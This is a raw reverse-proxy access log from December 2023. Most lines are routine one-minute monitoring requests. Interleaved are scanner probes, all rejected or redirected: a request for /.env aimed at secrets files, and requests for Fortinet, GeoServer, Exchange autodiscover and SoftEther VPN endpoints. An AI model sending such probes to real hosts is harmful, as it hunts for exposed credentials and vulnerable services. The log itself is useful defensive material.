91.92.243.232 - - [14/Dec/2023:12:32:15 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1957 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:12:32:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1958 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:12:32:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1959 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:12:33:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1960 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:12:33:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1961 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:12:34:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1962 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:12:34:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1963 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:12:35:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1964 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:12:35:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1965 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:12:36:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1966 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:12:36:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1967 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:12:37:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1968 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:12:37:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1969 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:12:38:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1970 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:12:38:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1971 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:12:39:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1972 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:12:39:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1973 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:12:40:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1974 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:12:40:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1975 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:12:41:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1976 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:12:41:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1977 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:12:42:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1978 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:12:42:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1979 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:12:43:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1980 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:12:43:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1981 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:12:44:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1982 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:12:44:39 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1983 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:12:45:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1984 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:12:45:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1985 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:12:46:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1986 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:12:46:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1987 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:12:47:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1988 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:12:47:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1989 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:12:48:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1990 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:12:48:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1991 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:12:49:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1992 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:12:49:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1993 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:12:50:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1994 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:12:50:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1995 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:12:51:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1996 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:12:51:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1997 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:12:52:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1998 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:12:52:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1999 "www@docker" "http://172.25.0.8:80" 0ms
68.69.186.30 - - [14/Dec/2023:12:53:21 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2000 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:12:53:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2001 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:12:53:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2002 "www@docker" "http://172.25.0.8:80" 0ms
65.49.1.113 - - [14/Dec/2023:12:54:17 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2003 "-" "-" 0ms
159.203.109.206 - - [14/Dec/2023:12:54:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2004 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:12:54:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2005 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:12:55:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2006 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:12:55:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2007 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:12:56:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2008 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:12:56:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2009 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:12:57:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2010 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:12:57:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2011 "www@docker" "http://172.25.0.8:80" 1ms
68.69.186.30 - - [14/Dec/2023:12:57:47 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2012 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:12:58:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2013 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:12:58:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2014 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:12:59:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2015 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:12:59:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2016 "www@docker" "http://172.25.0.8:80" 0ms
65.49.1.112 - - [14/Dec/2023:13:00:12 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 2017 "-" "-" 0ms
159.203.109.206 - - [14/Dec/2023:13:00:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2018 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:13:00:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2019 "www@docker" "http://172.25.0.8:80" 0ms
143.110.222.166 - - [14/Dec/2023:13:00:52 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2020 "web-to-websecure@internal" "-" 0ms
65.49.1.119 - - [14/Dec/2023:13:01:22 +0000] "GET /dns-query?name=dnsscan.shadowserver.org&type=A HTTP/1.1" 404 19 "-" "-" 2021 "-" "-" 0ms
159.203.109.206 - - [14/Dec/2023:13:01:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2022 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:13:01:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2023 "www@docker" "http://172.25.0.8:80" 0ms
65.49.1.114 - - [14/Dec/2023:13:01:43 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2024 "-" "-" 0ms
159.203.109.206 - - [14/Dec/2023:13:02:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2025 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:13:02:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2026 "www@docker" "http://172.25.0.8:80" 0ms
65.49.1.111 - - [14/Dec/2023:13:03:03 +0000] "GET /api/v2/static/not.found HTTP/1.1" 404 19 "-" "-" 2027 "-" "-" 0ms
65.49.1.116 - - [14/Dec/2023:13:03:13 +0000] "GET /remote/logincheck HTTP/1.1" 404 19 "-" "-" 2028 "-" "-" 0ms
159.203.109.206 - - [14/Dec/2023:13:03:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2029 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:13:03:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2030 "www@docker" "http://172.25.0.8:80" 0ms
65.49.1.119 - - [14/Dec/2023:13:04:16 +0000] "GET /geoserver/web/ HTTP/1.1" 404 19 "-" "-" 2031 "-" "-" 0ms
159.203.109.206 - - [14/Dec/2023:13:04:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2032 "www@docker" "http://172.25.0.8:80" 0ms
102.129.232.53 - - [14/Dec/2023:13:04:35 +0000] "HEAD / HTTP/1.1" 404 19 "-" "-" 2033 "-" "-" 0ms
102.129.232.53 - - [14/Dec/2023:13:04:36 +0000] "OPTIONS / HTTP/1.1" 404 19 "-" "-" 2034 "-" "-" 0ms
167.71.120.76 - - [14/Dec/2023:13:04:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2035 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:13:05:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2036 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:13:05:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2037 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:13:06:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2038 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:13:06:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2039 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:13:07:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2040 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:13:07:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2041 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:13:08:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2042 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:13:08:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2043 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:13:09:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2044 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:13:09:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2045 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:13:10:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2046 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:13:10:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2047 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:13:11:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2048 "www@docker" "http://172.25.0.8:80" 1ms
20.113.27.135 - - [14/Dec/2023:13:11:25 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2049 "-" "-" 0ms
167.71.120.76 - - [14/Dec/2023:13:11:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2050 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:13:12:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2051 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:13:12:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2052 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:13:13:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2053 "www@docker" "http://172.25.0.8:80" 1ms
143.110.222.166 - - [14/Dec/2023:13:13:34 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2054 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [14/Dec/2023:13:13:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2055 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:13:14:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2056 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:13:14:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2057 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:13:15:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2058 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:13:15:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2059 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:13:16:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2060 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:13:16:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2061 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:13:17:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2062 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:13:17:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2063 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:13:18:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2064 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:13:18:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2065 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:13:19:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2066 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:13:19:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2067 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:13:20:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2068 "www@docker" "http://172.25.0.8:80" 1ms
54.36.115.221 - - [14/Dec/2023:13:20:31 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 2069 "web-to-websecure@internal" "-" 0ms
54.36.115.221 - - [14/Dec/2023:13:20:32 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 2070 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [14/Dec/2023:13:20:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2071 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:13:21:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2072 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:13:21:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2073 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:13:22:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2074 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:13:22:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2075 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:13:23:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2076 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:13:23:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2077 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:13:24:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2078 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:13:24:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2079 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:13:25:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2080 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:13:25:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2081 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:13:26:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2082 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:13:26:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2083 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:13:27:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2084 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:13:27:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2085 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:13:28:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2086 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:13:28:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2087 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:13:29:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2088 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:13:29:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2089 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:13:30:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2090 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:13:30:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2091 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:13:31:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2092 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:13:31:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2093 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:13:32:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2094 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:13:32:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2095 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:13:33:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2096 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:13:33:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2097 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:13:34:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2098 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:13:34:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2099 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:13:35:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2100 "www@docker" "http://172.25.0.8:80" 1ms
74.82.47.3 - - [14/Dec/2023:13:35:35 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2101 "-" "-" 0ms
170.64.134.89 - - [14/Dec/2023:13:35:35 +0000] "GET /Temporary_Listen_Addresses HTTP/1.1" 404 19 "-" "-" 2102 "-" "-" 0ms
170.64.134.89 - - [14/Dec/2023:13:35:36 +0000] "GET /ews/exchanges/ HTTP/1.1" 404 19 "-" "-" 2103 "-" "-" 0ms
170.64.134.89 - - [14/Dec/2023:13:35:37 +0000] "GET /ews/exchange%20/ HTTP/1.1" 404 19 "-" "-" 2104 "-" "-" 0ms
170.64.134.89 - - [14/Dec/2023:13:35:38 +0000] "GET /ews/exchange/ HTTP/1.1" 404 19 "-" "-" 2105 "-" "-" 0ms
167.71.120.76 - - [14/Dec/2023:13:35:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2106 "www@docker" "http://172.25.0.8:80" 1ms
170.64.134.89 - - [14/Dec/2023:13:35:39 +0000] "GET /ews/%20/ HTTP/1.1" 404 19 "-" "-" 2107 "-" "-" 0ms
170.64.134.89 - - [14/Dec/2023:13:35:39 +0000] "GET /ews/ews/ HTTP/1.1" 404 19 "-" "-" 2108 "-" "-" 0ms
170.64.134.89 - - [14/Dec/2023:13:35:40 +0000] "GET /ews/autodiscovers/ HTTP/1.1" 404 19 "-" "-" 2109 "-" "-" 0ms
170.64.134.89 - - [14/Dec/2023:13:35:41 +0000] "GET /autodiscover/autodiscovers/ HTTP/1.1" 404 19 "-" "-" 2110 "-" "-" 0ms
170.64.134.89 - - [14/Dec/2023:13:35:42 +0000] "GET /autodiscover/autodiscover%20/ HTTP/1.1" 404 19 "-" "-" 2111 "-" "-" 0ms
170.64.134.89 - - [14/Dec/2023:13:35:43 +0000] "GET /autodiscover/autodiscoverrs/ HTTP/1.1" 404 19 "-" "-" 2112 "-" "-" 0ms
170.64.134.89 - - [14/Dec/2023:13:35:44 +0000] "GET /autodiscove/ HTTP/1.1" 404 19 "-" "-" 2113 "-" "-" 0ms
159.203.109.206 - - [14/Dec/2023:13:36:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2114 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:13:36:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2115 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:13:37:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2116 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:13:37:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2117 "www@docker" "http://172.25.0.8:80" 0ms
74.82.47.3 - - [14/Dec/2023:13:37:42 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 2118 "-" "-" 0ms
74.82.47.3 - - [14/Dec/2023:13:37:50 +0000] "GET /dns-query?name=dnsscan.shadowserver.org&type=A HTTP/1.1" 404 19 "-" "-" 2119 "-" "-" 0ms
74.82.47.3 - - [14/Dec/2023:13:37:55 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2120 "-" "-" 0ms
74.82.47.3 - - [14/Dec/2023:13:38:07 +0000] "GET /api/v2/static/not.found HTTP/1.1" 404 19 "-" "-" 2121 "-" "-" 0ms
74.82.47.3 - - [14/Dec/2023:13:38:13 +0000] "GET /remote/logincheck HTTP/1.1" 404 19 "-" "-" 2122 "-" "-" 0ms
159.203.109.206 - - [14/Dec/2023:13:38:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2123 "www@docker" "http://172.25.0.8:80" 0ms
74.82.47.3 - - [14/Dec/2023:13:38:28 +0000] "GET /geoserver/web/ HTTP/1.1" 404 19 "-" "-" 2124 "-" "-" 0ms
167.71.120.76 - - [14/Dec/2023:13:38:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2125 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:13:39:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2126 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:13:39:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2127 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:13:40:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2128 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:13:40:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2129 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:13:41:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2130 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:13:41:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2131 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:13:42:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2132 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:13:42:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2133 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:13:43:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2134 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:13:43:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2135 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:13:44:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2136 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:13:44:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2137 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:13:45:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2138 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:13:45:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2139 "www@docker" "http://172.25.0.8:80" 0ms
172.104.131.24 - - [14/Dec/2023:13:45:47 +0000] "POST /vpnsvc/connect.cgi HTTP/1.1" 404 19 "-" "-" 2140 "-" "-" 0ms
